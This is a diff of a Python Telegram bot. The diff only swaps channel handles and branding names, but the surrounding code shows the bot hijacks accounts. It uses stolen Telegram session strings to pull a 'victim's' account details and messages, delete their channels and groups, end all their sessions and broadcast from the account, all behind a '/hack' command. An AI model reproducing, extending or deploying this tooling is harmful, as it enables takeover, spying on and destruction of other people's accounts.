@@ -1,6 +1,6 @@
 
 from WWWL5 import bot, WWWL5
-#By Source aljoker @FFAARRSS1
+#By Source aljoker @EE_20
 from telethon import events, functions, types, Button
 from datetime import timedelta
 import asyncio
@@ -187,7 +187,7 @@ menu = '''
 
 '''
 mm = '''
-قم بلأنضمام الى قناة فايبرو @FFAARRSS1
+قم بلأنضمام الى قناة سبايدر @EE_20
 '''
 
 keyboard = [
@@ -212,7 +212,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("سورس فايبرو 🤡", "https://t.me/FFAARRSS1")
+    Button.url("سورس سبايدر 🕷", "https://t.me/EE_20")
     ]
 ]
 
@@ -254,7 +254,7 @@ async def start(event):
             Button.inline("N", data="N"),
             ],
           [
-            Button.url("المطور", "https://t.me/FFAARRSS1")
+            Button.url("المطور", "https://t.me/WWWL5")
             ]
         ]
         await x.send_message(f"اختر ماتريد فعله مع الجلسة \n\n{menu}", buttons=keyboard)
@@ -275,12 +275,12 @@ async def users(event):
         return await event.reply("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
       if len(i) > 1:
         file = open("session.txt", "w")
-        file.write(i + "\n\nDetails BY @FFAARRSS1")
+        file.write(i + "\n\nDetails BY @EE_20")
         file.close()
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nشكراً لأستخدامك سورس فايبرو ❤️. \n/hack", buttons=keyboard)
+        await event.reply(i + "\n\nشكراً لأستخدامك سورس سبايدر ❤️. \n/hack", buttons=keyboard)
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 async def users(event):
@@ -293,7 +293,7 @@ async def users(event):
     else:
       return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
     i = await userinfo(strses.text)
-    await event.reply(i + "\n\nشكراً لأستخدامك سورس فايبرو ❤️.\n/hack", buttons=keyboard)
+    await event.reply(i + "\n\nشكراً لأستخدامك سورس سبايدر ❤️.\n/hack", buttons=keyboard)
     
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
 async def users(event):
@@ -321,7 +321,7 @@ async def users(event):
       else:
         return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await usermsgs(strses.text)
-      await event.reply(i + "\n\nشكرا لأستخدامك سورس فايبرو", buttons=keyboard)
+      await event.reply(i + "\n\nشكرا لأستخدامك سورس سبايدر", buttons=keyboard)
     
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"E")))
@@ -367,7 +367,7 @@ async def users(event):
       await x.send_message("اعطيني معرف/ايدي القناة او الكروب")
       grpid = await x.get_response()
       await delgroup(strses.text, grpid.text)
-      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك فايبرو.", buttons=keyboard)
+      await event.reply("لقد تم حذف القناة/الكروب شكرا لأستخدامك سبايدر.", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"H")))
 async def users(event):
@@ -396,7 +396,7 @@ async def users(event):
       else:
         return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.", buttons=keyboard)
       i = await terminate(strses.text)
-      await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك فايبرو.", buttons=keyboard)
+      await event.reply("لقد تم انهاء جميع الجلسات شكراً لأستخدامك سبايدر.", buttons=keyboard)
 
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"J")))
 async def users(event):
@@ -486,7 +486,7 @@ async def start(event):
         Button.inline("c", data="c"),
         ],
       [
-        Button.url("القناة", "https://t.me/FFAARRSS1")
+        Button.url("القناة", "https://t.me/WWWL5")
         ]
     ]
     await event.reply("Now Give Me Flag Where U Want to Gcast \nâœ“ For All - Choose a\nâœ“ For Group - Choose b\nâœ“ For Private - Choose c", buttons=keyboard)
